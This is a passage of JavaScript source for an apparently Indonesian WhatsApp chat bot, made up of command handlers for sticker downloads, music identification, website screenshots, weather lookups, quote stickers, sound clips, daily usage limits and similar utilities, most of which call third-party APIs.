 '0899': 'Tri (3)',

 // SMARTFREN
 '0881': 'Smartfren',
 '0882': 'Smartfren',
 '0883': 'Smartfren',
 '0884': 'Smartfren',
 '0885': 'Smartfren',
 '0886': 'Smartfren',
 '0887': 'Smartfren',
 '0888': 'Smartfren',
 '0889': 'Smartfren'
 }

 let result = operator[prefix] || 'Operator tidak diketahui'

 reply(
 `ğŸ“± CEK SIM OPERATOR\n\n` +
 `â€¢ Nomor : ${num}\n` +
 `â€¢ Prefix : ${prefix}\n` +
 `â€¢ Operator : ${result}`
 )
}
break
case "tgstiker":
case "tgsticker":
if (!isPremium) return reply(mess.prem)
  if (!text) return reply("Kirim link Telegram sticker pack.");
async function sendTelegramPackAsStickers(sock, from, m, stickerUrl) {
  try {
    // --- FETCH API ---
    const apiURL = `https://api.nekolabs.web.id/downloader/telegram-sticker?url=${encodeURIComponent(stickerUrl)}`;
    const res = await axios.get(apiURL);
    const data = res.data;

    // --- VALIDASI ---
    if (!data.success || !data.result || !data.result.stickers) {
      return sock.sendMessage(from, { text: "Gagal mengambil stiker dari API." }, { quoted: fakeQuoted });
    }

    const packName = data.result.title || data.result.name;
    const stickerList = data.result.stickers;

    // --- INFO MULAI ---
    await sock.sendMessage(from, { text: `Mengirim ${stickerList.length} stiker...\nPack: *${packName}*` }, { quoted: fakeQuoted });

    // --- LOOP KIRIM STIKER ---
    for (const sticker of stickerList) {
      try {
        await sock.sendImageAsSticker(
          from,
          sticker.image_url,
          m,
          {
            packname: packName,
            author: "Telegram Sticker Downloader"
          }
        );

        await delay(400); // aman biar no flood
      } catch (sendErr) {
        console.error("Error kirim stiker:", sendErr);
      }
    }

    // --- INFO SELESAI ---
    await sock.sendMessage(from, { text: `Selesai!\nTotal terkirim: ${stickerList.length} stiker.` }, { quoted: fakeQuoted });

  } catch (err) {
    console.error("ERROR UTAMA:", err);
    return sock.sendMessage(from, { text: "Terjadi error saat mengambil pack." }, { quoted: fakeQuoted });
  }
}

// === DELAY FUNCTION ===
function delay(ms) {
  return new Promise(res => setTimeout(res, ms));
}
  await sendTelegramPackAsStickers(sock, from, m, text);
  break;
case "whatmusic":
case "whm": {
    if (!quoted) return reply(`Audionya mana?`);
    if (!/audio/.test(mime)) return reply(`Reply audio yang valid!`);

    React();

    // Download audio
    let media = await sock.downloadAndSaveMediaMessage(quoted);
    let response = await CatBox(media);

    // Fetch API
    const api = await fetchJson(`https://api-faa.my.id/faa/whatmusic?url=${response}`);
    if (!api.status) return reply("Gagal mengambil data!");

    // Ambil data dari api.result
    const res = api.result;

    const text = `
ğŸµ *WHAT MUSIC RESULT*
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
â€¢ *Title:* ${res.title}
â€¢ *Artist:* ${res.artist}
â€¢ *Duration:* ${res.duration}
â€¢ *Views:* ${res.views}
â€¢ *Uploaded:* ${res.uploadedAt}
â€¢ *Channel:* ${res.channel}
â€¢ *URL:* ${res.url}
`;

    await sock.sendMessage(
        m.chat,
        {
            image: { url: res.thumbnail },
            caption: text
        },
        { quoted: fakeQuoted }
    );
}
break 
case "ssweb":
case "screenshotweb": {
  if (!text) return reply(`Contoh:\n.ssweb https://example.com`);

  let url = text.trim();

  let buttons = [
    {
      buttonId: `.ssweb-type android|${url}`,
      buttonText: { displayText: 'ğŸ“± Android' },
      type: 1
    },
    {
      buttonId: `.ssweb-type pc|${url}`,
      buttonText: { displayText: 'ğŸ–¥ï¸ PC' },
      type: 1
    },
    {
      buttonId: `.ssweb-type tablet|${url}`,
      buttonText: { displayText: 'ğŸ“² Tablet' },
      type: 1
    }
  ];

  await sock.sendMessage(m.chat, {
    text: `ğŸŒ *Screenshot Website*\n\nPilih tipe tampilan:`,
    buttons,
    headerType: 1
  }, { quoted: fakeQuoted });
}
break;  
case 'ssweb-type': {
  let [type, url] = text.split('|');
  if (!type || !url) return;

  let api = `https://api.zenitsu.web.id/api/tools/ssweb?url=${encodeURIComponent(url)}&type=${type}&full=full`;

  await sock.sendMessage(m.chat, {
    image: { url: api },
    caption: `ğŸ“¸ *Screenshot Website*\n\nğŸŒ URL: ${url}\nğŸ“± Type: ${type.toUpperCase()}`
  }, { quoted: fakeQuoted });
}
break;
case 'rch':
case 'reactionch':
case 'reactch': {
  if (!q) return reply('âŒ Format salah\n\nContoh:\n.rch linkchannel | ğŸ˜€')

  const [link, react] = q.split('|').map(v => v.trim())
  if (!link) return reply('âŒ Link channel tidak boleh kosong')
  if (!react) return reply('âŒ Emoji reaction tidak boleh kosong')

  reply('â³ Mengirim reaction ke channel...')

  const apiUrl = `https://api-faa.my.id/faa/react-channel?url=${encodeURIComponent(link)}&react=${encodeURIComponent(react)}`
  const res = await fetch(apiUrl)
  const json = await res.json()

  if (!json.status) return reply('âŒ Gagal mengirim reaction')

  reply(
    `âœ… *Reaction Berhasil*\n\n` +
    `ğŸ§© Reaction: ${json.info.reaction_used}\n` +
    `ğŸ”— Channel:\n${json.info.destination}`
  )
}
break
case 'cuaca': {
    if (!text) return reply(`Format salah!\n\nContoh:\n.cuaca Ambon|Sirimau|Ahusen`);

    let [kab, kec, desa] = text.split("|");
    if (!kab || !kec || !desa) return reply(`Format tidak valid!\n\nContoh:\n.cuaca Ambon|Sirimau|Ahusen`);

    reply(`Mendapatkan data cuaca...`);

    try {
        let url = `https://api-faa.my.id/faa/cuaca?kabupaten=${encodeURIComponent(kab)}&kecamatan=${encodeURIComponent(kec)}&desa=${encodeURIComponent(desa)}`;
        let res = await fetch(url);
        let data = await res.json();

        if (!data.status) return reply(`Data tidak ditemukan!`);

        let lokasi = data.lokasi;
        let prediksi = data.prediksi_harian;

        let listCuaca = data.cuaca.slice(0, 6) // ambil 6 jam ke depan
            .map(v => `ğŸ•’ ${v.jam}
${v.emoji} *${v.deskripsi}*
ğŸŒ§ï¸ Hujan: ${v.rain_mm}mm (${v.peluang_hujan}%)
ğŸŒ¡ï¸ Suhu: ${v.instant.air_temperature}Â°C
ğŸ’¨ Angin: ${v.instant.wind_speed} m/s
`).join("\n");

        let teks = `
*ğŸŒ¦ï¸ CUACA HARI INI*
Lokasi: *${lokasi.desa}, ${lokasi.kecamatan}, ${lokasi.kabupaten}*
Zona waktu: ${lokasi.timezone}

*ğŸ“Œ Prediksi Hari Ini*
Ringkas: ${prediksi.ringkas}
Detail: ${prediksi.detail}
Peluang rata-rata: ${prediksi.informasi.rata_rata_peluang}
Total hujan: ${prediksi.informasi.total_hujan_mm}mm

*â±ï¸ 6 Jam Ke Depan*
${listCuaca}
`;

        reply(teks);

    } catch (err) {
        console.log(err);
        reply(`Terjadi error mengambil data cuaca.`);
    }
}
break;
case 'get': {
      if (!text) return reply(`Contoh: ${cmd} linknya`)
      if (!text.includes('http')) return reply(`Contoh: ${cmd} linknya`)

      try {
        const data = await axios.get(text)
        const contentType = data.headers["content-type"]

        if (contentType.startsWith('image/')) {
          sock.sendMessage(m.chat, {
            image: {
              url: text
            },
            caption: `${text}\n\n*Headers Respons:*\n${Object.entries(data.headers).map(([key, value]) => `*${key}:* ${value}`).join('\n')}`
          }, {
            quoted: fakeQuoted
          })

        } else if (contentType.startsWith('video/')) {
          sock.sendMessage(m.chat, {
            video: {
              url: text
            },
            caption: `${text}\n\n*Headers Respons:*\n${Object.entries(data.headers).map(([key, value]) => `*${key}:* ${value}`).join('\n')}`
          }, {
            quoted: fakeQuoted
          })

        } else if (contentType.startsWith('audio/')) {
          sock.sendMessage(m.chat, {
            audio: {
              url: text
            },
            mimetype: 'audio/mpeg'
          }, {
            quoted: fakeQuoted
          })

        } else {
          reply(util.format(data.data))

          const saveFileToDisk = async (url, outputPath) => {
            const response = await axios.get(url, {
              responseType: 'arraybuffer'
            })
            const contentType = response.headers['content-type']
            const ext = contentType.split('/')[1] || 'bin'
            const filePath = `${outputPath}.${ext}`

            return new Promise((resolve, reject) => {
              fs.writeFile(filePath, response.data, (err) => {
                if (err) reject(err)
                else resolve({
                  file: filePath,
                  ext,
                  mime: contentType
                })
              })
            })
          }

          try {
            const buffer = await sock.downloadAndSaveMediaMessage(m.quoted || m)
            await sleep(2000)

            const mimeType = await getMimeType(buffer)
            sock.sendMessage(m.chat, {
              document: fs.readFileSync(buffer),
              mimetype: mimeType,
              fileName: `get-data.${mimeType}`
            }, {
              quoted: fakeQuoted
            })

            fs.unlinkSync(buffer)
          } catch (error) {
            console.error('Gagal menyimpan:', error)
          }
        }
      } catch (error) {
        reply('Terjadi kesalahan')
        console.error('Error:', error)
      }
    }
    break
case 'esm2cjs':
case 'esm2cjsfile': {
  // ambil teks dari quoted atau teks command
  const q = m.quoted ? m.quoted : m;
  const text = (q.msg && (q.msg.text || q.msg.caption)) || q.text || '';
  if (!text) return reply('Kirim/quote kode ESM yang ingin di-convert.');

  try {
    // pilih method: quick atau babel
    const useBabel = false; // ganti ke true kalau mau pakai Babel (pastikan dep terinstall)
    let converted;

    if (useBabel) {
      // jika pakai Babel, pastikan require('@babel/core') tersedia
      const babel = require('@babel/core');
      const res = await babel.transformAsync(text, {
        plugins: ['@babel/plugin-transform-modules-commonjs'],
        sourceType: 'module',
        configFile: false,
        babelrc: false,
      });
      converted = res.code;
    } else {
      // pakai converter regex sederhana
      converted = convertEsmToCjs(text); // dari fungsi di atas
    }

    // kirim hasil sebagai file .cjs agar rapi
    const buffer = Buffer.from(converted, 'utf8');
    await sock.sendMessage(m.chat, {
      document: buffer,
      fileName: 'converted.cjs',
      mimetype: 'text/javascript'
    }, { quoted: fakeQuoted });

  } catch (err) {
    console.error(err);
    reply('Gagal convert: ' + err.message);
  }
  break;
}
case 'readmore':
case 'selengkapnya': {
if (!q) return reply(`masukan text contoh ${cmd} kamujelek|tapii boong`)
let [l, r] = text.split`|`
if (!l) l = ''
if (!r) r = ''
reply(l + readmore + r)
}
break 
case "pendek": {
  if (!text && !m.quoted)
    return reply(`Kirim atau reply video yang ingin dijadikan video pendek (bulat)!`);

  let media;
  if (m.quoted && m.quoted.mtype === 'videoMessage') {
    media = await m.quoted.download();
  } else if (/^https?:\/\//.test(text)) {
    media = { url: text };
  } else if (!m.quoted) {
    return reply(`Kirim atau reply video dengan caption *${prefix + command}*`);
  }

// Ambil tujuan dari input user atau default ke m.chat
let tujuan = text && text.includes('@') ? text : m.chat;

// Jika ingin membatasi hanya owner untuk kirim ke channel (opsional)
if (tujuan.endsWith('@newsletter') && !isOwner) {
    return reply(`âŒ Hanya owner yang boleh mengirim ke saluran!`);
}

// Kirim video PTV (bulat) ke semua jenis tujuan
await sock.sendMessage(tujuan, {
    video: media,
    mimetype: 'video/mp4',
    gifPlayback: false,
    viewOnce: true,
    ptv: true   // membuat video bulat
}, { quoted: fakeQuoted });

  reply(`âœ… Video pendek (bulat) berhasil dikirim!`);
}
break;
// Command limit
case "tomedia": {
    if (!m.quoted) return reply(`âš ï¸ Reply ke *dokumen foto/video* yang ingin dikonversi menjadi media!`)
    
    let mime = m.quoted.mimetype || ''
    if (!/image|video/.test(mime)) return reply(`âš ï¸ File tidak didukung! Harus berupa dokumen *foto* atau *video*.`)

    try {
        let media = await m.quoted.download()
        if (!media) return reply(`âŒ Gagal mengunduh media.`)
        reply(" loading...")
        if (/image/.test(mime)) {
            await sock.sendMessage(m.chat, { image: media, caption: `âœ… Berhasil dikonversi dari dokumen ke foto.` }, { quoted: fakeQuoted })
        } else if (/video/.test(mime)) {
            await sock.sendMessage(m.chat, { video: media, caption: `âœ… Berhasil dikonversi dari dokumen ke video.` }, { quoted: fakeQuoted })
        } else {
            reply(`âŒ Format file tidak dikenali.`)
        }
    } catch (err) {
        console.error(err)
        reply(`âŒ Terjadi kesalahan saat konversi media.`)
    }
}
break
case 'limit':
case 'mylimit': {
reply(getLimitInfo(m.sender))
}
break

// Command daily
case 'daily':
case 'claim': {
const user = global.db.users[m.sender]
  const now = Date.now()
  const cooldown = 24 * 60 * 60 * 1000

  if (user.lastclaim && (now - user.lastclaim) < cooldown) {
    const timeLeft = cooldown - (now - user.lastclaim)
    const hours = Math.floor(timeLeft / (60 * 60 * 1000))
    const minutes = Math.floor((timeLeft % (60 * 60 * 1000)) / (60 * 1000))
    
    return reply(`â³ *Anda sudah claim hari ini!*\nTunggu ${hours} jam ${minutes} menit lagi.`)
  }

  user.lastclaim = now
  user.freelimit += 100
  user.limit += 5

  reply(`ğŸ *CLAIM HARIAN BERHASIL!*

â• *Mendapatkan:*
â€¢ 25 Limit Gratis
â€¢ 5 Limit Biasa

${getLimitInfo(m.sender)}`)
}
break
case "hdvideo":
case "hdvid": {

  if (!quoted) return reply('Reply videonya dulu!');
  if (!/video/.test(quoted.mtype)) return reply('Yang direply harus video.');
  React()
  // Download media dari pesan yang direply
  let media = await sock.downloadAndSaveMediaMessage(quoted);

  // Upload ke CatBox (dapat URL hasil upload)
  let response = await CatBox(media);

  // Fetch ke API HD Video
  let res = await fetch(`https://api-faa.my.id/faa/hdvid?url=${encodeURIComponent(response)}`);
  let json = await res.json();

  // Pastikan hasil valid
  if (!json.status || !json.result?.download_url) return reply('Gagal memproses video.');

  // Kirim hasil video HD ke chat
  await sock.sendMessage(m.chat, {
    video: { url: json.result.download_url },
    caption: 'ğŸ¥ *Video HD berhasil diproses!*'
  }, { quoted: fakeQuoted });

  // Hapus file lokal jika ada
  try { fs.unlinkSync(media) } catch {}

}
break;
case "vn": {

try {
if (!text) return reply(`Masukkan teks untuk diubah jadi suara!\n\nContoh:\n.vn halo semuanya`)

const api = `https://api-faa.my.id/faa/tts-legkap?text=${encodeURIComponent(text)}`
const response = await fetch(api)
const res = await response.json()

if (!res.status) return reply(`âŒ Gagal memuat data dari API.`)
if (!res.result || res.result.length === 0) return reply(`âŒ Tidak ada hasil suara yang ditemukan.`)

let sukses = 0, gagal = 0
for (let item of res.result) {
    if (item.url) {
        await sock.sendMessage(m.chat, {
            audio: { url: item.url },
            mimetype: 'audio/mp4',
            ptt: false, // kirim sebagai voice note (vn)
            caption: `ğŸ™ï¸ *Model:* ${item.voice_name || item.model}`
        }, { quoted: fakeQuoted })
        sukses++
    } else {
        gagal++
    }
}

await reply(`âœ… *Berhasil:* ${sukses}\nâŒ *Gagal:* ${gagal}\n\nTotal: ${res.result.length} model suara.`)

} catch (e) {
console.log(e)
reply(`âš ï¸ Terjadi kesalahan saat memproses perintah.`)
}
}
break
case 'qcstc':
    case 'stcqc':
    case 'qcstic':
    case 'qc':
    case 'qcstick': {

if (!args[0]) return reply(`Contoh: ${cmd} white halo`)
      if (!args[1]) return reply(`Contoh: ${cmd} white halo`)
      if (text.length > 80) return reply(`Maximal 80 karakter!`)
      let [color, ...message] = text.split(' ')
      message = m.quoted ? m.quoted : message.join(' ')
      let backgroundColor
      switch (color) {
      case 'pink':
        backgroundColor = '#f68ac9'
        break
      case 'blue':
        backgroundColor = '#6cace4'
        break
      case 'red':
        backgroundColor = '#f44336'
        break
      case 'green':
        backgroundColor = '#4caf50'
        break
      case 'yellow':
        backgroundColor = '#ffeb3b'
        break
      case 'purple':
        backgroundColor = '#9c27b0'
        break
      case 'darkblue':
        backgroundColor = '#0d47a1'
        break
      case 'lightblue':
        backgroundColor = '#03a9f4'
        break
      case 'ash':
        backgroundColor = '#9e9e9e'
        break
      case 'orange':
        backgroundColor = '#ff9800'
        break
      case 'black':
        backgroundColor = '#000000'
        break
      case 'white':
        backgroundColor = '#ffffff'
        break
      case 'teal':
        backgroundColor = '#008080'
        break
      case 'lightpink':
        backgroundColor = '#FFC0CB'
        break
      case 'chocolate':
        backgroundColor = '#A52A2A'
        break
      case 'salmon':
        backgroundColor = '#FFA07A'
        break
      case 'magenta':
        backgroundColor = '#FF00FF'
        break
      case 'tan':
        backgroundColor = '#D2B48C'
        break
      case 'wheat':
        backgroundColor = '#F5DEB3'
        break
      case 'deeppink':
        backgroundColor = '#FF1493'
        break
      case 'fire':
        backgroundColor = '#B22222'
        break
      case 'skyblue':
        backgroundColor = '#00BFFF'
        break
      case 'brightskyblue':
        backgroundColor = '#1E90FF'
        break
      case 'hotpink':
        backgroundColor = '#FF69B4'
        break
      case 'lightskyblue':
        backgroundColor = '#87CEEB'
        break
      case 'seagreen':
        backgroundColor = '#20B2AA'
        break
      case 'darkred':
        backgroundColor = '#8B0000'
        break
      case 'orangered':
        backgroundColor = '#FF4500'
        break
      case 'cyan':
        backgroundColor = '#48D1CC'
        break
      case 'violet':
        backgroundColor = '#BA55D3'
        break
      case 'mossgreen':
        backgroundColor = '#00FF7F'
        break
      case 'darkgreen':
        backgroundColor = '#008000'
        break
      case 'navyblue':
        backgroundColor = '#191970'
        break
      case 'darkorange':
        backgroundColor = '#FF8C00'
        break
      case 'darkpurple':
        backgroundColor = '#9400D3'
        break
      case 'fuchsia':
        backgroundColor = '#FF00FF'
        break
      case 'darkmagenta':
        backgroundColor = '#8B008B'
        break
      case 'darkgray':
        backgroundColor = '#2F4F4F'
        break
      case 'peachpuff':
        backgroundColor = '#FFDAB9'
        break
      case 'darkishgreen':
        backgroundColor = '#BDB76B'
        break
      case 'darkishred':
        backgroundColor = '#DC143C'
        break
      case 'goldenrod':
        backgroundColor = '#DAA520'
        break
      case 'darkishgray':
        backgroundColor = '#696969'
        break
      case 'darkishpurple':
        backgroundColor = '#483D8B'
        break
      case 'gold':
        backgroundColor = '#FFD700'
        break
      case 'silver':
        backgroundColor = '#C0C0C0'
        break
      default:
        return reply('Warna tersebut tidak ditemukan!')
      }
      const username = m.pushName
      const avatar = await sock.profilePictureUrl(m.sender, "image").catch(() => 'https://files.catbox.moe/nwvkbt.png')
      const json = {
        type: 'quote',
        format: 'png',
        backgroundColor,
        width: 512,
        height: 768,
        scale: 2,
        messages: [{
          entities: [],
          avatar: true,
          from: {
            id: 1,
            name: username,
            photo: {
              url: avatar
            }
          },
          text: message,
          replyMessage: {}
        }]
      }
      const response = await axios.post('https://bot.lyo.su/quote/generate', json, {
        headers: {
          'Content-Type': 'application/json'
        }
      })
      const buffer = Buffer.from(response.data.result.image, 'base64')
      sock.sendImageAsSticker(m.chat, buffer, m, {
        packname: name,
        author: name
      })
    }
    break
    case 'mangkane1':
    case 'mangkane2':
    case 'mangkane3':
    case 'mangkane4':
    case 'mangkane5':
    case 'mangkane6':
    case 'mangkane7':
    case 'mangkane8':
    case 'mangkane9':
    case 'mangkane10':
    case 'mangkane11':
    case 'mangkane12':
    case 'mangkane13':
    case 'mangkane14':
    case 'mangkane15':
    case 'mangkane16':
    case 'mangkane17':
    case 'mangkane18':
    case 'mangkane19':
    case 'mangkane20':
    case 'mangkane21':
    case 'mangkane22':
    case 'mangkane23':
    case 'mangkane24':
    case 'mangkane25':
    case 'mangkane26':
    case 'mangkane27':
    case 'mangkane28':
    case 'mangkane29':
    case 'mangkane30':
    case 'mangkane31':
    case 'mangkane32':
    case 'mangkane33':
    case 'mangkane34':
    case 'mangkane35':
    case 'mangkane36':
    case 'mangkane37':
    case 'mangkane38':
    case 'mangkane39':
    case 'mangkane40':
    case 'mangkane41':
    case 'mangkane42':
    case 'mangkane43':
    case 'mangkane44':
    case 'mangkane45':
    case 'mangkane46':
    case 'mangkane47':
    case 'mangkane48':
    case 'mangkane49':
    case 'mangkane50':
    case 'mangkane51':
    case 'mangkane52':
    case 'mangkane53':
    case 'mangkane54':
      viot = 'https://telegra.ph/file/48b67f699cfa231e4d5c2.jpg'
      thumb = 'https://telegra.ph/file/48b67f699cfa231e4d5c2.jpg'
      let sound
      
      if (/sound/.test(command)) sound = `https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`
      if (/mangkane/.test(command) && command.replace('mangkane', '') < 25) sound = `https://raw.githubusercontent.com/hyuura/Rest-Sound/main/HyuuraKane/${command}.mp3`
      if (/mangkane/.test(command) && command.replace('mangkane', '') > 24) sound = `https://raw.githubusercontent.com/aisyah-rest/mangkane/main/mangkanenya/${command}.mp3`
      if (/acumalaka|reza-kecap|farhan-kebab|omaga|omaga|kamu-nanya|anjay|siuu/.test(command)) sound = `https://github.com/FahriAdison/Base-Sound/raw/main/audio/${command}.mp3`
      if (text.toLowerCase() === 'thumb') {
      const oggBuf = await mp3ToOgg(sound)
        await sock.sendMessage(m.chat, {
          audio: {
            url: oggBuf
          },
          mimetype: 'audio/mpeg',
          ptt: true,
          contextInfo: {
            externalAdReply: {
              mediaUrl: groupbot,
              mediaType: 2,
              title: '  â‡†ã…¤ ||â—ã…¤âšâšã…¤â–·||ã…¤ â†»  ',
              body: '  â”â”â”â”â¬¤â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€  ',
              description: 'Now Playing...',
              mediaType: 2,
              sourceUrl: groupbot,
              thumbnail: await (await fetch(viot)).buffer(),
              renderLargerThumbnail: true
            }
          }
        }, {
          quoted: fakeQuoted
        })
      } else await sock.sendMessage(m.chat, {
        audio: {
          url: sound
        },
        mimetype: 'audio/mpeg',
        ptt: false
      }, {
        quoted: fakeQuoted
      })
      break
case 'music1':
case 'music2':
case 'music3':
case 'music4':
case 'music5':
case 'music6':
case 'music7':
case 'music8':
case 'music9':
case 'music10':
case 'music11':
case 'music12':
case 'music13':
case 'music14':
case 'music15':
case 'music16':
case 'music17':
case 'music18':
case 'music19':
case 'music20':
case 'music21':
case 'music22':
case 'music23':
case 'music24':
case 'music25':
case 'music26':
case 'music27':
case 'music28':
case 'music29':
case 'music30':
case 'music31':
case 'music32':
case 'music33':
case 'music34':
case 'music35':
case 'music36':
case 'music37':
case 'music38':
case 'music39':
case 'music40':
case 'music41':
case 'music42':
case 'music43':
case 'music44':
case 'music45':
case 'music46':
case 'music47':
case 'music48':
case 'music49':
case 'music50':
case 'music51':
case 'music52':
case 'music53':
case 'music54':
case 'music55':
case 'music56':
case 'music57':
case 'music58':
case 'music59':
case 'music60':
case 'music61':
case 'music62':
case 'music63':
case 'music64':
case 'music65': {

  // Ambil file musik dari repo GitHub
  const xyroorynzz = await (await fetch(`https://github.com/Rez4-3yz/Music-rd/raw/master/music/${command}.mp3`))

  // Kirim audio sebagai voice note
  await sock.sendMessage(m.chat, {
    audio: xyroorynzz,
    mimetype: 'audio/ogg; codecs=opus',
    ptt: false,
    quoted: fakeQuoted
  }).catch(() => {
    return ('Error!')
  })
}
break
case 'getpaste':
case 'pastebin':
case 'getpb': {

if (!text || !text.includes('pastebin.com')) {
        return reply(`âš ï¸ Masukkan link Pastebin yang valid!\n\nContoh: ${cmd} https://pastebin.com/Gu8RZaqv`);
    }
 
    // Kirim pesan loading dan simpan key-nya
    const statusMsg = await sock.sendMessage(m.chat, { text: 'â³ Sedang mengambil konten dari Pastebin...' }, { quoted: fakeQuoted });
    const key = statusMsg.key;
 
    try {
        const apiUrl = `https://zelapioffciall.koyeb.app/tools/pastebin?url=${encodeURIComponent(text)}`;
        const { data } = await axios.get(apiUrl);
 
        if (!data.status || !data.content) {
            throw new Error('Gagal mengambil konten dari link tersebut.');
        }
 
        const lineCount = data.content.split('\n').length;
        const timestamp = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
 
        const caption = `
âœ… *Konten Pastebin Berhasil Diambil:*
 
ğŸ•¹ ID: ${data.paste_id}
ğŸ“† Waktu: ${timestamp}
ğŸ“ Jumlah Baris: ${lineCount}
â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
${data.content}
        `.trim();
        
        // Edit pesan loading menjadi pesan sukses
        await sock.sendMessage(m.chat, { text: caption, edit: key });
 
    } catch (error) {
        console.error('Error di fitur getpaste:', error);
        const errorCaption = `âŒ Terjadi kesalahan: ${error.message}`;
        // Edit pesan loading menjadi pesan error
        await sock.sendMessage(m.chat, { text: errorCaption, edit: key });
    }
}
break;
case 'bfstock':
case 'bloxfruitstock': {

reply('ğŸ“ Sedang mengambil data stok terbaru dari Blox Fruits...');
 
    try {
        const apiUrl = 'https://www.gamersberg.com/api/blox-fruits/stock';
        const { data } = await axios.get(apiUrl);
 
        let stockData, lastUpdate;
 
        if (data && data.data && data.data.length > 0) {
            stockData = data.data[0];
            lastUpdate = new Date(data.meta.lastUpdateTime * 1000).toLocaleTimeString('id-ID', { timeZone: 'Asia/Jakarta' });
        } else if (data && data.stock) {
            stockData = data.stock;
            lastUpdate = new Date(data.stock.updated).toLocaleTimeString('id-ID', { timeZone: 'Asia/Jakarta' });
        } else {
            throw new Error('Format API tidak dikenal atau data kosong.');
        }
        
        const normalStock = stockData.normalStock || stockData.normal;
        const mirageStock = stockData.mirageStock || stockData.mirage;
 
        const emojiMap = { "Rocket": "ğŸš€", "Spin": "ğŸŒªï¸", "Chop": "âš”ï¸", "Spring": "ğŸŒ€", "Bomb": "ğŸ’£", "Smoke": "ğŸ’¨", "Spike": "ğŸŒµ", "Flame": "ğŸ”¥", "Falcon": "ğŸ¦…", "Ice": "â„ï¸", "Sand": "â³", "Dark": "ğŸŒ‘", "Diamond": "ğŸ’", "Light": "ğŸ’¡", "Rubber": "ğŸˆ", "Barrier": "ğŸ§±", "Ghost": "ğŸ‘»", "Magma": "ğŸŒ‹", "Quake": "ğŸ’¥", "Buddha": "ğŸ§˜", "Love": "â¤ï¸", "Spider": "ğŸ•·ï¸", "Sound": "ğŸµ", "Phoenix": "ğŸ”¥", "Portal": "ğŸŒ€", "Rumble": "âš¡", "Pain": "ğŸ¾", "Blizzard": "ğŸŒ¨ï¸", "Gravity": "â˜„ï¸", "Mammoth": "ğŸ˜", "T-Rex": "ğŸ¦–", "Dough": "ğŸ©", "Shadow": "ğŸ‘¤", "Venom": "â˜ ï¸", "Control": "ğŸ•¹ï¸", "Spirit": "ğŸ‘»", "Dragon": "ğŸ‰", "Leopard": "ğŸ†", "Kitsune": "ğŸ¦Š", "Blade": "âš”ï¸", "Eagle": "ğŸ¦…", "Creation": "âœ¨" };
        const formatFruitName = (name) => {
            const parts = name.split('-');
            if (parts.length === 2 && parts[0] === parts[1]) return parts[0];
            return name.replace(/-/g, ' ');
        };
        const formatCategory = (title, emojiHeader, items) => {
            if (!items || items.length === 0) return `*${emojiHeader} ${title}:*\n- Stok tidak tersedia.\n\n`;
            let text = `${emojiHeader} *${title}*\n`;
            text += items.map(item => {
                const name = formatFruitName(item.name);
                const emoji = emojiMap[name] || 'â”';
                return `- ${emoji} ${name} (ğŸ’²${item.price.toLocaleString('id-ID')})`;
            }).join('\n');
            return text + '\n\n';
        };
 
        let replyText = `*ğŸ“ Stok Buah Blox Fruits (Update: ${lastUpdate} WIB)*\n\n`;
        replyText += formatCategory('Normal Stock', 'ğŸª', normalStock);
        replyText += formatCategory('Mirage Stock', 'ğŸï¸', mirageStock);
 
        reply(replyText.trim());
 
    } catch (error) {
        console.error('Error di fitur bfstock:', error);
        reply(`âŒ Terjadi kesalahan saat mengambil data stok Blox Fruits.`);
    }
}

break;
//============ Sad
    case 'sad1':
    case 'sad2':
    case 'sad3':
    case 'sad4':
    case 'sad5':
    case 'sad6':
    case 'sad7':
    case 'sad8':
    case 'sad9':
    case 'sad10':
    case 'sad11':
    case 'sad12':
    case 'sad13':
    case 'sad14':
    case 'sad15':
    case 'sad16':
    case 'sad17':
    case 'sad18':
    case 'sad19':
    case 'sad20':
    case 'sad21':
    case 'sad22':
    case 'sad23':
    case 'sad24':
    case 'sad25':
    case 'sad26':
    case 'sad27':
    case 'sad28':
    case 'sad29':
    case 'sad30':
    case 'sad31':
    case 'sad32':
    case 'sad33':
    case 'sad34':
    case 'sad35':
    case 'sad36':
    case 'sad37':
    case 'sad38':
    case 'sad39':
    case 'sad40':
    case 'sad41':
    case 'sad42':
    case 'sad43':
    case 'sad44':
    case 'sad45':
    case 'sad46':
    case 'sad47':
    case 'sad48':
    case 'sad49':
    case 'sad50':
    case 'sad51':
    case 'sad52':
    case 'sad53':
    case 'sad54':
    case 'sad55': {

try {
        let link = `https://raw.githubusercontent.com/Leoo7z/Music/main/sad-music/${command}.mp3`
        await sock.sendMessage(m.chat, {
          audio: {
            url: link
          },
          mimetype: 'audio/mpeg'
        }, {
          quoted: fakeQuoted
        })
      } catch (err) {
        reply(`Terjadi kesalahan: ${err}`)
      }
    }
    break
    case 'sound1':
    case 'sound2':
    case 'sound3':
    case 'sound4':
    case 'sound5':
    case 'sound6':
    case 'sound7':
    case 'sound8':
    case 'sound9':
    case 'sound10':
    case 'sound11':
    case 'sound12':
    case 'sound13':
    case 'sound14':
    case 'sound15':
    case 'sound16':
    case 'sound17':
    case 'sound18':
    case 'sound19':
    case 'sound20':
    case 'sound21':
    case 'sound22':
    case 'sound23':
    case 'sound24':
    case 'sound25':
    case 'sound26':
    case 'sound27':
    case 'sound28':
    case 'sound29':
    case 'sound30':
    case 'sound31':
    case 'sound32':
    case 'sound33':
    case 'sound34':
    case 'sound35':
    case 'sound36':
    case 'sound37':
    case 'sound38':
    case 'sound39':
    case 'sound40':
    case 'sound41':
    case 'sound42':
    case 'sound43':
    case 'sound44':
    case 'sound45':
    case 'sound46':
    case 'sound47':
    case 'sound48':
    case 'sound49':
    case 'sound50':
    case 'sound51':
    case 'sound52':
    case 'sound53':
    case 'sound54':
    case 'sound55':
    case 'sound56':
    case 'sound57':
    case 'sound58':
    case 'sound59':
    case 'sound60':
    case 'sound61':
    case 'sound62':
    case 'sound63':
    case 'sound64':
    case 'sound65':
    case 'sound66':
    case 'sound67':
    case 'sound68':
    case 'sound69':
    case 'sound70':
    case 'sound71':
    case 'sound72':
    case 'sound73':
    case 'sound74':
    case 'sound75':
    case 'sound76':
    case 'sound77':
    case 'sound78':
    case 'sound79':
    case 'sound80':
    case 'sound81':
    case 'sound82':
    case 'sound83':
    case 'sound84':
    case 'sound85':
    case 'sound86':
    case 'sound87':
    case 'sound88':
    case 'sound89':
    case 'sound90':
    case 'sound91':
    case 'sound92':
    case 'sound93':
